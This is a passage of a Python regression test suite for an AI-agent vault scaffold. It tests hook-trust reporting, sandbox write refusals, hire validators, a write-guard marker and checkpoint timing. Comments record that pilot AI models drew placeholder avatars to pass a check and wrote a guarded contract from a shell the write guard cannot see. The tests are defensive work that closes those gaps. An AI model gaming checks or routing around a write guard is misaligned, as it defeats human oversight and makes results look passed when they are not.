                _si_fail("scaffold-init/harness-json-control: the real generator "
                         "wrote a harness.json the contract refuses: %s" % "; ".join(_why))
            else:
                _si_green()

        # --- 10b. does Codex trust THIS folder's hooks? ---
        # Codex keeps the answer in its own config, keyed by the ABSOLUTE path
        # of the hooks file, so the reported state has to change with the path
        # and with the file. The failure this guards is the worst shape a guard
        # can have: `codex exec` never asks and silently runs no untrusted
        # hook, so a member with untrusted hooks has every guard off and a
        # terminal that looks exactly like one where they are on. A doctor that
        # said "unknown" forever, or worse said "no" because it could not open
        # a file, would be a second guard with the same disease.
        #
        # CODEX_HOME is pointed at a fixture on every case, including the ones
        # that expect "no": on a machine that HAS trusted its hooks, reading
        # the real config would make those pass for the wrong reason.

        def _trust_case(label, want, body):
            """body: None writes no config, a str writes one, False makes the
            path a directory, which is a file that exists and cannot be read."""
            _si_count()
            _vt = _si_fixture(_t / ("trust-" + label))
            home = _t / ("trust-home-" + label)
            (home / ".codex").mkdir(parents=True, exist_ok=True)
            cfg = home / ".codex" / "config.toml"
            if body is False:
                cfg.mkdir()
            elif body is not None:
                cfg.write_text(body, encoding="utf-8")
            r = _si(_vt, "doctor", "--json", "--no-tests", env={"CODEX_HOME": str(home)})
            f = _vt / _HJ
            if not f.is_file():
                _si_fail("scaffold-init/codex-trust[%s]: doctor wrote no harness.json "
                         "(exit %d)\n%s" % (label, r.returncode, (r.stdout + r.stderr)[:300]))
                return
            doc = json.loads(f.read_text(encoding="utf-8"))
            row = next((h for h in doc.get("hosts", []) if h.get("id") == "codex"), None)
            if row is None:
                _si_fail("scaffold-init/codex-trust[%s]: no codex host in harness.json" % label)
                return
            got = row.get("trusted")
            if got != want:
                _si_fail("scaffold-init/codex-trust[%s]: trusted is %r, expected %r"
                         % (label, got, want))
                return
            if not row.get("sandbox"):
                _si_fail("scaffold-init/codex-trust[%s]: the codex row carries no "
                         "sandbox flag, so the plugin has nothing to show" % label)
                return
            if want == "no" and "NOT TRUSTED" not in (row.get("trusted_note") or ""):
                _si_fail("scaffold-init/codex-trust[%s]: reported no, but the note "
                         "does not say so in words a member reads" % label)
                return
            _si_green()

        _trust_case(
            "proved", "yes",
            '[hooks.state."%s/.codex/hooks.json:PreToolUse:0:0"]\n'
            'trusted_hash = "3f9a2c"\n' % (_t / "trust-proved").resolve())
        _trust_case(
            "another-path", "no",
            '[hooks.state."/somewhere/else/.codex/hooks.json:PreToolUse:0:0"]\n'
            'trusted_hash = "3f9a2c"\n')
        _trust_case("unreadable", "unknown", False)
        # and an entry for the right path that was never reviewed: a table with
        # no trusted_hash is not a trust, and reading it as one would be the
        # easiest way to write this check wrong.
        _trust_case(
            "no-hash", "no",
            '[hooks.state."%s/.codex/hooks.json:PreToolUse:0:0"]\n'
            'last_seen = "2026-09-14"\n' % (_t / "trust-no-hash").resolve())

        # the reds: a generator broken one way each time
        for _label, _find, _replace in (
                ("no-schema", '        "schema": HARNESS_SCHEMA,\n', ""),
                ("a-host-missing",
                 'HOSTS = ("claude-code", "codex", "gemini", "cursor")',
                 'HOSTS = ("claude-code", "codex", "gemini")')):
            _si_count()
            _vb = _si_fixture(_t / ("harness-" + _label))
            _gen = _vb / "06 AI Team" / "AI Team Knowledge" / "Scripts" / "scaffold-init.py"
            _text = _gen.read_text(encoding="utf-8")
            if _find not in _text:
                _si_fail("scaffold-init/harness-json[%s]: the line this case breaks "
                         "is not in the generator any more, so the case proved "
                         "nothing and has to be rewritten" % _label)
                continue
            _gen.write_text(_text.replace(_find, _replace, 1), encoding="utf-8")
            _si(_vb, "doctor", "--json", "--no-tests")
            if not (_vb / _HJ).is_file():
                # A generator that crashes instead of writing is also a refusal,
                # but not the one under test: the contract check never ran.
                _si_fail("scaffold-init/harness-json[%s]: the broken generator wrote "
                         "no file, so the contract check never saw anything" % _label)
            elif not _harness_broken(json.loads((_vb / _HJ).read_text(encoding="utf-8"))):
                _si_fail("scaffold-init/harness-json[%s]: the contract accepted a "
                         "harness.json the generator broke on purpose" % _label)
            else:
                _si_green()

        # --- 10d (control). a clean apply still exits 0 -------------------
        # R3 makes apply exit 1 when a path was refused. Without this control
        # the only thing proved would be that apply can be made to fail.
        _si_count()
        _vz = _si_fixture(_t / "apply-clean-exit")
        _rz = _si(_vz, "apply")
        if _rz.returncode != 0:
            _si_fail("scaffold-init/apply-clean-control: an apply that was refused "
                     "nothing exited %d\n%s" % (_rz.returncode,
                                                (_rz.stdout + _rz.stderr)[-300:]))
        else:
            _si_green()

        # --- 11. a host sandbox that refuses the write must say so in words
        # (pilot C finding F4). Codex's workspace-write sandbox refuses .codex/
        # and .agents/ even inside the workspace, so `apply` cannot finish from
        # inside a Codex session and the new agent silently gets no shim.
        # A read-only folder is the same refusal (EACCES/EPERM) and is the only
        # way to produce it here without a Codex session.
        import os as _os3
        _si_count()
        _sv = _si_fixture(_t / "sandbox")
        _si(_sv, "apply")                       # first apply writes everything
        _tgt = Path(_sv) / ".codex"
        if not _tgt.is_dir() or _os3.geteuid() == 0:
            _si_skip("no .codex/ was generated, or this runs as root, so a "
                     "refused write cannot be produced here")
        else:
            # force one file to be regenerated, then close the folder
            _one = next(iter(sorted(_tgt.rglob("*.toml"))), None)
            if _one is None:
                _si_skip("the fixture generated no .codex file to re-write")
            else:
                _one.write_text("hand broken\n", encoding="utf-8")
                _mode = _os3.stat(_one.parent).st_mode
                _os3.chmod(_one, 0o444)
                _os3.chmod(_one.parent, 0o555)
                try:
                    r = _si(_sv, "apply")
                    if "PERMISSION DENIED" not in (r.stdout + r.stderr):
                        _si_fail("scaffold-init/sandbox-refusal: apply did not name the "
                                 "refused path in words:\n%s"
                                 % (r.stdout + r.stderr)[-400:])
                    elif "Traceback" in (r.stderr or ""):
                        _si_fail("scaffold-init/sandbox-refusal: apply crashed instead "
                                 "of naming the refusal")
                    elif "from your OWN terminal" not in (r.stdout + r.stderr):
                        _si_fail("scaffold-init/sandbox-refusal: it named the refusal "
                                 "but not the command the member should run")
                    else:
                        _si_green()
                    # AND THE EXIT CODE (Silas's Codex re-run, R3). It said
                    # INCOMPLETE in prose and returned 0, so a caller reading
                    # the code reported a clean activation with no shims, no
                    # skills and no guards behind it.
                    _si_count()
                    if r.returncode == 0:
                        _si_fail("scaffold-init/apply-exits-nonzero-when-refused: "
                                 "apply printed INCOMPLETE and exited 0, which is a "
                                 "green that is not green")
                    else:
                        _si_green()
                finally:
                    _os3.chmod(_one.parent, _mode)
                    _os3.chmod(_one, 0o644)


# --- end of the scaffold-init cases ---


    # ---------------------------------------------------------------------
    # The hire validators: check-hire.py, skill-doctor.py, new-agent.py
    # (Mack, 2026-09-14, audit rows 9 and 10). Each case builds its own
    # throwaway folder through check-hire.py's own fixture builder.
    # ---------------------------------------------------------------------
    import importlib.util as _ilu
    import os as _os

    _CH = HERE / "check-hire.py"
    _SD = HERE / "skill-doctor.py"
    _NA = HERE / "new-agent.py"
    _EM_DASH = chr(0x2014)

    def _expect_ok(name, argv, env=None):
        """The clean control half: a guard that refuses ordinary work proves
        as little as one that refuses nothing."""
        global checks
        checks += 1
        r = subprocess.run([PY] + argv, capture_output=True, text=True, env=env)
        if r.returncode != 0:
            fails.append("%s: clean control was refused (exit %d): %s"
                         % (name, r.returncode, (r.stderr or r.stdout or "").strip()[:200]))
        return r

    if not (_CH.is_file() and _SD.is_file() and _NA.is_file()):
        skip("hire-validators", "check-hire.py, skill-doctor.py or new-agent.py is not in Scripts/")
    else:
        _spec = _ilu.spec_from_file_location("check_hire_fixtures", str(_CH))
        _ch = _ilu.module_from_spec(_spec)
        _spec.loader.exec_module(_ch)

        # The validator's own self-test: it plants every defect it claims to
        # catch and asserts each turns its check red.
        _expect_ok("check-hire/self-test", [str(_CH), "--self-test"])

        _clean = _ch.build_fixture(tmp / "hire-clean", public=True, scripts_dir=HERE)
        _expect_ok("check-hire/clean-control", [str(_CH), "Testy", "--root", str(_clean)])

        # A waiver in the contract's `brief_waived:` field, with no workup
        # folder at all, is the shape the eight shipped contracts now use
        # (Vex gate 2026-09-14). Without this control, check 21's greens would
        # all be coming from the workup note and the field would be untested.
        _wv = _ch.build_fixture(tmp / "hire-waiver-field", public=True, scripts_dir=HERE)
        shutil.rmtree(str(_wv / _ch.WIP_REL / "2026-09-14-testy-hire"))
        _c = _wv / _ch.AGENTS_REL / "Testy" / "AGENT.md"
        _c.write_text(_c.read_text(encoding="utf-8").replace(
            "Research brief: [[03 WiP/2026-09-14-testy-hire/research]].",
            "No research brief: the domain was already settled."), encoding="utf-8")
        _expect_ok("check-hire/waiver-in-contract-field",
                   [str(_CH), "Testy", "--root", str(_wv)])

        # A PLACEHOLDER AVATAR MUST NOT READ AS OK (pilot C finding F6). Both
        # pilot models drew a flat square to turn check 5 green, one of them
        # 1254x1254, so "square PNG" was never the question. WARN, not FAIL:
        # a hire is not blocked on a picture, but the roster must say the
        # picture is not there yet. FAIL would make the check unusable and
        # somebody would switch it off.
        def _ch_rows(vault_dir):
            r = subprocess.run([PY, str(_CH), "Testy", "--root", str(vault_dir), "--json"],
                               capture_output=True, text=True)
            try:
                return {row["n"]: row for row in
                        _json.loads(r.stdout)["agents"][0]["checks"]}
            except Exception as e:
                fails.append("check-hire/avatar-placeholder: report unreadable (%s)" % e)
                return {}

        for _nm, _mk, _why in (
                ("one-pixel", lambda v: _ch.write_png(
                    v / "06 AI Team/AI Team Knowledge/Avatars/testy.png", 1, 1), "1x1"),
                ("flat-fill", lambda v: _ch.write_png(
                    v / "06 AI Team/AI Team Knowledge/Avatars/testy.png", 512, 512),
                 "one flat colour at a plausible size"),
                ("named-placeholder", lambda v: (
                    v / "06 AI Team/AI Team Knowledge/Avatars" / "testy.placeholder"
                ).write_text("Pixel owes the real one\n", encoding="utf-8"),
                 "a .placeholder sidecar")):
            _pv = _ch.build_fixture(tmp / ("hire-avatar-" + _nm), public=True,
                                    scripts_dir=HERE)
            _mk(_pv)
            checks += 1
            _rows = _ch_rows(_pv)
            if _rows and _rows.get(5, {}).get("status") == "OK":
                fails.append("check-hire/avatar-placeholder-%s: check 5 reads OK on "
                             "%s; a drawn stand-in turns the check green without "
                             "the thing being true" % (_nm, _why))
            elif _rows and "placeholder" not in _rows.get(5, {}).get("message", ""):
                fails.append("check-hire/avatar-placeholder-%s: check 5 is not OK but "
                             "does not say placeholder, so nobody knows Pixel is "
                             "still owed one: %r" % (_nm, _rows.get(5, {}).get("message")))

        # THE HIRING MARKER, the other end of the write guard's door.
        # A green run must delete it, and one left behind past its 24 hours is
        # residue that reads like an open door and is not one.
        _mv = _ch.build_fixture(tmp / "hire-marker-green", public=True, scripts_dir=HERE)
        _mkf = _mv / _ch.AGENTS_REL / "Testy" / ".hiring"
        _mkf.write_text(_j.dumps({"started": _dt.datetime.now(_dt.timezone.utc)
                                  .strftime("%Y-%m-%dT%H:%M:%SZ"), "agent": "Testy"}),
                        encoding="utf-8")
        _expect_ok("check-hire/marker-green-run", [str(_CH), "Testy", "--root", str(_mv)])
        checks += 1
        if _mkf.exists():
            fails.append("check-hire/marker-cleared-on-green: the hiring marker "
                         "survived a green run, so that contract stays writable by "
                         "every later session")
        _sv = _ch.build_fixture(tmp / "hire-marker-stale", public=True, scripts_dir=HERE)
        _skf = _sv / _ch.AGENTS_REL / "Testy" / ".hiring"
        _skf.write_text(_j.dumps({"started": (_dt.datetime.now(_dt.timezone.utc)
                                              - _dt.timedelta(hours=40))
                                  .strftime("%Y-%m-%dT%H:%M:%SZ"), "agent": "Testy"}),
                        encoding="utf-8")
        checks += 1
        _r = subprocess.run([PY, str(_CH), "Testy", "--root", str(_sv), "--json"],
                            capture_output=True, text=True)
        try:
            _rows = {row["n"]: row for row in
                     _json.loads(_r.stdout)["agents"][0]["checks"]}
            if _rows.get(23, {}).get("status") != "WARN":
                fails.append("check-hire/marker-stale-is-a-finding: a 40-hour-old "
                             "hiring marker reads %r, not WARN"
                             % _rows.get(23, {}).get("status"))
        except Exception as e:
            fails.append("check-hire/marker-stale-is-a-finding: report unreadable (%s)" % e)

        _broken = _ch.build_fixture(tmp / "hire-broken", public=True, scripts_dir=HERE)
        (_broken / ".claude" / "agents" / "testy.md").unlink()
        expect_refusal("check-hire/missing-shim", [str(_CH), "Testy", "--root", str(_broken)])

        def _skill(folder, text):
            d = _clean / "06 AI Team/AI Team Knowledge/Skills" / folder
            d.mkdir(parents=True, exist_ok=True)
            (d / "SKILL.md").write_text(text, encoding="utf-8")
            return d

        _good = ("---\nname: %s\ndescription: Do the thing. Use when the user says "
                 "\"do the thing\".\n---\n<!-- GENERATED by scaffold-init.py -->\n\n"
                 "Read `06 AI Team/AI Team Knowledge/SOPs/SOP-900-fixture.md` now and "
                 "follow it exactly.\n")
        (_clean / "06 AI Team/AI Team Knowledge/SOPs/SOP-900-fixture.md").write_text("# fixture\n")
        (_clean / "06 AI Team/AI Team Knowledge/SOPs/SOP-901-fixture.md").write_text("# fixture\n")

        _expect_ok("skill-doctor/clean-control",
                   [str(_SD), str(_skill("testy-do-thing", _good % "testy-do-thing")),
                    "--root", str(_clean)])
        expect_refusal("skill-doctor/bad-name",
                       [str(_SD), str(_skill("Testy_DoThing", _good % "Testy_DoThing")),
                        "--root", str(_clean)])
        expect_refusal("skill-doctor/missing-pointer",
                       [str(_SD), str(_skill("testy-no-pointer",
                                             "---\nname: testy-no-pointer\ndescription: Do it. "
                                             "Use when the user says do it.\n---\n"
                                             "<!-- GENERATED by scaffold-init.py -->\n\n"
                                             "Just do the thing, somehow.\n")),
                        "--root", str(_clean)])
        expect_refusal("skill-doctor/two-pointers",
                       [str(_SD), str(_skill("testy-two-pointers",
                                             (_good % "testy-two-pointers").rstrip("\n")
                                             + "\nAlso read `06 AI Team/AI Team Knowledge/SOPs/"
                                               "SOP-901-fixture.md`.\n")),
                        "--root", str(_clean)])
        expect_refusal("skill-doctor/em-dash",
                       [str(_SD), str(_skill("testy-dash",
                                             (_good % "testy-dash").rstrip("\n")
                                             + "\nA line with an " + _EM_DASH + " in it.\n")),
                        "--root", str(_clean)])

        _na_root = _ch.build_fixture(tmp / "hire-new", public=True, scripts_dir=HERE)
        shutil.copy2(str(_NA), str(_na_root / "06 AI Team/AI Team Knowledge/Scripts/new-agent.py"))
        _na = _na_root / "06 AI Team/AI Team Knowledge/Scripts/new-agent.py"
        _argv = [str(_na), "Newby", "--slug", "newby", "--role", "Fixture helper",
                 "--root", str(_na_root)]

        # THE HIRE DROPS THE MARKER, AND DOES NOT ASK FOR AN ENV VAR
        # (pilot C finding F1). Until 2026-09-14 this script refused to run
        # without ICOR_UNLOCK_WRITES=1, and this case asserted that refusal.
        # The refusal was the defect: an environment variable cannot be set on
        # one tool call, so the only way to obey it is to write the contract
        # from a shell, which is exactly where the write guard cannot look.
        # Both pilot CLIs did that. The marker is what replaced it.
        _env = dict(_os.environ)
        _env.pop("ICOR_UNLOCK_WRITES", None)
        _expect_ok("new-agent/dry-run-control", _argv + ["--dry-run"], env=_env)
        checks += 1
        _r = subprocess.run([PY] + _argv, capture_output=True, text=True, env=_env)
        if _r.returncode != 0:
            fails.append("new-agent/marker-instead-of-an-env-var: refused to scaffold "
                         "with no ICOR_UNLOCK_WRITES set (%s); the hire path is the "
                         "marker now, and an env var it cannot set is what sent both "
                         "pilot CLIs into a shell"
                         % (_r.stderr or _r.stdout).strip()[:160])
        _mkr = _na_root / "06 AI Team/Agents/Newby/.hiring"
        checks += 1
        if not _mkr.is_file():
            fails.append("new-agent/marker-instead-of-an-env-var: no .hiring marker "
                         "beside the contract, so the write guard has no way to tell "
                         "this contract write from any other")
        else:
            checks += 1
            try:
                _mdoc = _json.loads(_mkr.read_text(encoding="utf-8"))
            except ValueError as _e:
                _mdoc = {}
                fails.append("new-agent/marker-instead-of-an-env-var: the marker is "
                             "not JSON (%s), so nothing can read its age" % _e)
            for _k in ("started", "agent"):
                checks += 1
                if not _mdoc.get(_k):
                    fails.append("new-agent/marker-instead-of-an-env-var: the marker "
                                 "carries no `%s`, and a marker with no start time is "
                                 "a door that never closes" % _k)

        _env2 = dict(_os.environ)
        _env2["ICOR_UNLOCK_WRITES"] = "1"
        checks += 1
        _r2 = subprocess.run([PY] + _argv, capture_output=True, text=True, env=_env2)
        if _r2.returncode == 0:
            fails.append("new-agent/refuses-overwrite: ran twice and did not refuse the second "
                         "time; a contract that can be overwritten is not canonical")
        elif "Traceback" in (_r2.stderr or ""):
            fails.append("new-agent/refuses-overwrite: crashed instead of refusing")



# ===========================================================================
# BEGIN expansion-pack block (batch b2, Vex ruling 2026-09-15). Keep additions
# to the expansion-pack guards inside these two markers: a second writer works
# in this file at the same time and a block with edges is a block that rebases.
# ===========================================================================
# 86. THE EXPANSION PACK INSTALLER.
#
# Its fixture suite is run whole rather than restated here, one case per Vex
# finding: F1 (no Scripts target), F2 (no __pycache__ segment and no .pyc .pyo
# .pyd .so .dylib .pth .plist .pyw .egg-link), F3 (an Agents name that differs
# only by case from a real folder), F4 (a pack namespace on every installed
# SOP, Workstream, Guideline and Template, with the EP- control that must
# still install), F5a/F5b/F5c (the receipt lives in .icor-for-life/expansions/,
# a forged in-pack one neither reports a pack installed nor enables `remove`,
# and a pack folder carrying one is refused at install).
#
# Each of those was watched red against the code as it stood on 3bf26a7 before
# the fix landed. `--break-me` proves the suite can still go red, because a
# fixture suite nobody watched fail is a green that proves nothing.
#
# It is NOT --fast-skipped. It builds temporary vaults, so it is not free, but
# a fast run that skips the security fix is a fast run that reports a green
# nobody earned.
_ep_suite = HERE / "test-expansion-pack.py"
checks += 1
_ep = subprocess.run([PY, str(_ep_suite)], capture_output=True, text=True)
if _ep.returncode != 0:
    fails.append("expansion-pack/fixture-suite: "
                 + (_ep.stderr or _ep.stdout or "").strip()[-1500:])
expect_fail("expansion-pack/suite-can-go-red", [str(_ep_suite), "--break-me"])
# ===========================================================================
# END expansion-pack block
# ===========================================================================


# ===========================================================================
# 85. --fast MUST STILL FAIL ON A BROKEN GUARD.
#
# A flag that makes a suite quicker is a flag that can make it quieter, and
# the way that happens is never deliberate: a group gets skipped, an exception
# gets swallowed, an exit code gets lost on the way out. So this runs the whole
# file again with --fast and with the write guard replaced by a stub that
# refuses nothing, which is the canonical broken guard, and asserts the fast
# run goes red and names a write-guard case.
#
# The child sees ICOR_RED_TESTS_SELF_SABOTAGE and skips THIS case, so there is
# no third run. It costs one fast run, which is the cost --fast exists to make
# small.
#
# WHAT THIS DOES NOT PROVE: that --fast runs the same cases as a full run. It
# proves the fail path survives the flag. The groups --fast skips are named on
# stdout and in the summary, which is the only honest claim available.
if SELF_SABOTAGE or FAST:
    # The meta-case belongs to the FULL run. Running it inside --fast would
    # make every fast run pay for a second fast run, which is the one cost
    # --fast exists to remove, and the claim it proves ("--fast still fails")
    # is a property of this file rather than of today's tree.
    pass
else:
    checks += 1
    _env = dict(os.environ)
    _env["ICOR_RED_TESTS_SELF_SABOTAGE"] = "1"
    _child = subprocess.run([PY, str(Path(__file__).resolve()), "--fast"],
                            capture_output=True, text=True, env=_env)
    if _child.returncode == 0:
        fails.append("fast/still-fails-on-a-broken-guard: --fast exited 0 with the "
                     "write guard replaced by a stub that refuses nothing, so the "
                     "flag can hide a dead guard")
    elif "write-guard/" not in (_child.stderr or ""):
        fails.append("fast/still-fails-on-a-broken-guard: --fast went red, but no "
                     "write-guard case is named, so it went red for some other "
                     "reason and this case proves nothing: %s"
                     % (_child.stderr or _child.stdout or "")[:200])
    # and the control: the flag must be accepted at all, and an unknown flag
    # must be refused rather than ignored.
    checks += 1
    _typo = subprocess.run([PY, str(Path(__file__).resolve()), "--fsat"],
                           capture_output=True, text=True)
    if _typo.returncode != 2:
        fails.append("fast/unknown-flag-is-refused: --fsat exited %d; a mistyped "
                     "flag that silently runs the whole suite tells the caller the "
                     "flag worked" % _typo.returncode)


# ---- BEGIN mack b8 ----
# ===========================================================================
# 89-95. BRIAN CARROLL ROUND TWO, the code half (B2-2, B2-3, B2-4, B2-6,
#        B2-8). Own block, own edges, beside Silas's and for the same
#        reason: two people editing the middle of this file at once is a
#        rebase nobody needs.
#
# Every case here was watched RED on ea663ac before its fix landed. Which
# red, per case, is named in the comment above it.
with tempfile.TemporaryDirectory() as _mktd:
    _mk = Path(_mktd)
    import datetime as _mkdt
    try:
        import zoneinfo as _mkzi
    except ImportError:                                   # pragma: no cover
        _mkzi = None

    # -----------------------------------------------------------------
    # 89. THE CHECKPOINT CUTOFF IS THE SESSION, NOT THE LOG (B2-2).
    #
    # WS-1005 runs the report BEFORE it writes the session log, so at report
    # time the newest log is the PREVIOUS session's and the cutoff taken
    # from its name is hours too early or a whole session too late
    # depending on which way round you read it. Brian reproduced both ends:
    # a task closed after the session started but before the log was
    # written vanished from the session that shipped it, and a task filed
    # after the log was still listed by the NEXT session.
    #
    # The cutoff is `started` from .icor-for-life/scripts/session.json now,
    # with the log name as the fallback for a runtime with no session start
    # hook. Two traps this case exists to pin:
    #   - Python 3.9's fromisoformat rejects the trailing Z that
    #     session-start.py writes, so the parse is done by hand.
    #   - `started` is UTC-aware and mtime() is naive local, so the compare
    #     is made aware on both sides.
    # The zones are pinned rather than inherited: run in UTC, a naive-local
    # compare and an aware one agree, and the case would prove nothing.
    # America/Chicago is Brian's. Asia/Tokyo is east of UTC and has no DST,
    # so it catches a sign error the western zone hides.
    if _mkzi is None:
        skip("checkpoint-cutoff", "zoneinfo is not importable under this python3")
    else:
        _S = _mkdt.datetime(2026, 9, 15, 12, 0, tzinfo=_mkdt.timezone.utc)
        _LOG_AT = _S + _mkdt.timedelta(hours=3)      # the log's own minute
        _CLOSED_AT = _S + _mkdt.timedelta(hours=1)   # closed after start, before the log
        _S2 = _S + _mkdt.timedelta(hours=6)          # the next session starts
        _FILED_AT = _S + _mkdt.timedelta(hours=4)    # filed after the log, before it

        def _mk_touch(p, when):
            ts = when.timestamp()
            os.utime(p, (ts, ts))

        def _mk_started(v, when):
            (v / ".icor-for-life/scripts").mkdir(parents=True, exist_ok=True)
            (v / ".icor-for-life/scripts/session.json").write_text(json.dumps({
                "schema": 1, "session_id": "red-test",
                "started": when.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "id_source": "red test",
            }, indent=2) + "\n", encoding="utf-8")

        def _mk_listed(v, zone):
            r = subprocess.run([PY, str(v / "06 AI Team/AI Team Knowledge/Scripts/checkpoint.py"),
                                str(v), "--json"],
                               capture_output=True, text=True,
                               env={**os.environ, "TZ": zone})
            if r.returncode != 0:
                return None, r
            try:
                rep = json.loads(r.stdout)
            except ValueError:
                return None, r
            return {e["file"] for e in rep["tasks_touched_since_last_log"]}, r

        for _zone in ("America/Chicago", "Asia/Tokyo"):
            _tz = _mkzi.ZoneInfo(_zone)
            _v = fixture_vault(_mk, "cutoff-" + _zone.replace("/", "-"))
            _tasks = _v / "06 AI Team/AI Team Knowledge/Tasks"
            # Everything the scaffold already ships is pushed well behind the
            # window, so the two files this case plants are the only ones
            # whose timing is in question.
            for _old in _tasks.rglob("*.md"):
                _mk_touch(_old, _S - _mkdt.timedelta(days=10))
            # The session log, named for its LOCAL minute in the pinned zone
            # (GL-1004), which is the whole point: its name and the UTC
            # `started` are two different clocks.
            _loc = _LOG_AT.astimezone(_tz)
            _ldir = _v / ("06 AI Team/AI Team Knowledge/Session Logs/%04d/%02d"
                          % (_loc.year, _loc.month))
            _ldir.mkdir(parents=True, exist_ok=True)
            _lf = _ldir / (_loc.strftime("%Y-%m-%d-%H-%M") + "_mack_cutoff.md")
            _lf.write_text("# log\n", encoding="utf-8")
            _mk_touch(_lf, _LOG_AT)

            # a. closed after the session started, before the log was written
            _done = _tasks / "done/2026/09"
            _done.mkdir(parents=True, exist_ok=True)
            _closed = _done / "2026-09-15-closed-before-the-log.md"
            _closed.write_text("---\ntype: task\nstatus: done\n---\n\n# closed\n",
                               encoding="utf-8")
            _mk_touch(_closed, _CLOSED_AT)
            _mk_started(_v, _S)
            checks += 1
            _seen, _r = _mk_listed(_v, _zone)
            if _seen is None:
                fails.append("checkpoint-cutoff/closed-before-the-log (%s): "
                             "checkpoint exited %d or printed no JSON: %s"
                             % (_zone, _r.returncode,
                                (_r.stderr or _r.stdout or "").strip()[:300]))
            elif _closed.name not in _seen:
                fails.append("checkpoint-cutoff/closed-before-the-log (%s): a "
                             "task closed an hour after this session started "
                             "and two hours before the log was written is not "
                             "listed. The cutoff came from the log's name, so "
                             "the session that shipped the task cannot see it "
                             "(Brian Carroll, B2-2). listed: %s"
                             % (_zone, sorted(_seen)))

            # b. filed after the log, read by the NEXT session
            _open = _tasks / "open"
            _open.mkdir(parents=True, exist_ok=True)
            _filed = _open / "2026-09-15-filed-after-the-log.md"
            _filed.write_text("---\ntype: task\nstatus: open\n---\n\n# filed\n",
                              encoding="utf-8")
            _mk_touch(_filed, _FILED_AT)
            _mk_started(_v, _S2)
            checks += 1
            _seen2, _r2 = _mk_listed(_v, _zone)
            if _seen2 is None:
                fails.append("checkpoint-cutoff/filed-after-the-log (%s): "
                             "checkpoint exited %d or printed no JSON: %s"
                             % (_zone, _r2.returncode,
                                (_r2.stderr or _r2.stdout or "").strip()[:300]))
            elif _filed.name in _seen2:
                fails.append("checkpoint-cutoff/filed-after-the-log (%s): a task "
                             "filed during the PREVIOUS session, after its log "
                             "was written, is listed as touched by this one. "
                             "The cutoff is this session's start, not the last "
                             "log's name (Brian Carroll, B2-2). listed: %s"
                             % (_zone, sorted(_seen2)))

    # -----------------------------------------------------------------
    # 90. A BARE LINK RESOLVES INSIDE THE ROOMS THIS REPORT READS (B2-3).
    #
    # A habit and its planner-habit note carry the SAME name by design, one
    # in `02 Planner/Habits/` (three segments) and one in `04 Inner World/
    # My Life/Habits/` (four). The 1.24.0 resolver sorted candidates by
    # depth, so a bare `[[X]]` anywhere in the vault always credited its
    # backlink to the Planner copy, which is outside SCAN_ROOTS and is
    # never reported on. The member's own habit note then read as an orphan
    # with a link to it sitting in plain sight in a topic note.
    #
    # The shape is the reported one: a BARE link, written in prose. Silas's
    # ruling path-qualifies the two FIELDS of a habit pair, and case 88
    # above proves new-entity.py writes them qualified; neither reaches a
    # link a member typed into a paragraph.
    #
    # WHAT THIS DOES NOT PROVE: that the Planner copy is reported on. It is
    # not, and that is by design; SCAN_ROOTS is unchanged.
    _rv = fixture_vault(_mk, "resolver-scan-roots")
    (_rv / "02 Planner/Habits").mkdir(parents=True, exist_ok=True)
    (_rv / "02 Planner/Habits/ZZ Probe Habit.md").write_text(
        "---\ntype: planner-habit\nname: ZZ Probe Habit\ncadence: daily\n"
        "status: active\ncreated: 2026-09-16\ntags: []\n---\n\n## Log\n",
        encoding="utf-8")
    (_rv / "04 Inner World/My Life/Habits/ZZ Probe Habit.md").write_text(
        "---\ntype: habit\ncreated: 2026-09-16\nname: ZZ Probe Habit\n"
        "status: active\nplanner_habit: \ntags: []\n---\n\n# ZZ Probe Habit\n",
        encoding="utf-8")
    (_rv / "04 Inner World/My Life/Topics/ZZ Probe Topic.md").write_text(
        "---\ntype: topic\ncreated: 2026-09-16\nrelated_topics: []\ntags: []\n"
        "---\n\n# ZZ Probe Topic\n\nI keep this up with [[ZZ Probe Habit]].\n",
        encoding="utf-8")
    checks += 1
    _rq = subprocess.run([PY, str(_rv / "06 AI Team/AI Team Knowledge/Scripts/check-quality.py"),
                          str(_rv), "--json"], capture_output=True, text=True)
    if _rq.returncode != 0:
        fails.append("resolver-prefers-scan-roots/bare-link: check-quality "
                     "exited %d: %s" % (_rq.returncode,
                                        (_rq.stderr or _rq.stdout or "").strip()[:300]))
    else:
        try:
            _rep = json.loads(_rq.stdout)
        except ValueError:
            _rep = None
        if _rep is None:
            fails.append("resolver-prefers-scan-roots/bare-link: check-quality "
                         "--json printed something that is not JSON:\n%s"
                         % _rq.stdout[-300:])
        else:
            _orph = {f["path"] for f in _rep.get("findings", [])
                     if f["metric"] == "orphans"}
            _target = "04 Inner World/My Life/Habits/ZZ Probe Habit.md"
            if _target in _orph:
                fails.append("resolver-prefers-scan-roots/bare-link: the habit "
                             "note is reported as an orphan although a topic "
                             "links to it by name. The bare link resolved to "
                             "the shorter `02 Planner/Habits/` copy, which this "
                             "report never reads, so the backlink was credited "
                             "to a note nobody looks at (Brian Carroll, B2-3). "
                             "orphans: %s" % sorted(_orph))
            elif not (_rv / "02 Planner/Habits/ZZ Probe Habit.md").is_file():
                fails.append("resolver-prefers-scan-roots/bare-link: the Planner "
                             "half of the pair is gone from the fixture, so the "
                             "resolver had nothing to choose BETWEEN and this "
                             "case passed for the wrong reason")


    # -----------------------------------------------------------------
    # 91. AGENT JOURNALS ARE IN SCOPE FOR check-quality (B2-8).
    #
    # SCAN_ROOTS names three rooms and `06 AI Team` is not one of them, so a
    # journal entry could carry any type at all and the report said ok. The
    # GLOB `06 AI Team/Agents/*/Journal/*.md` is in scope now, never the
    # room: `06 AI Team` whole is 98 findings on the pristine tree and a
    # broken health line, from three questions nobody has ruled on.
    #
    # Measured on this tree with the glob: 0 findings, which is the number
    # Silas measured after the GL-1002 rulings of 1.27.0 landed. A non-zero
    # reading here means a shipped journal drifted, not that this case
    # broke.
    _jv = fixture_vault(_mk, "journal-in-scope")
    _jdir = _jv / "06 AI Team/Agents/Mack/Journal"
    _jdir.mkdir(parents=True, exist_ok=True)
    _bad_j = _jdir / "2026-09-16-undeclared-type.md"
    _bad_j.write_text(
        "---\ntype: field-notes\nagent_id: mack\ncreated: 2026-09-16\n"
        "topic: a type GL-1002 does not declare\n---\n\n## What I learned\n",
        encoding="utf-8")
    checks += 1
    _jq = subprocess.run([PY, str(_jv / "06 AI Team/AI Team Knowledge/Scripts/check-quality.py"),
                          str(_jv), "--json"], capture_output=True, text=True)
    try:
        _jrep = json.loads(_jq.stdout) if _jq.returncode == 0 else None
    except ValueError:
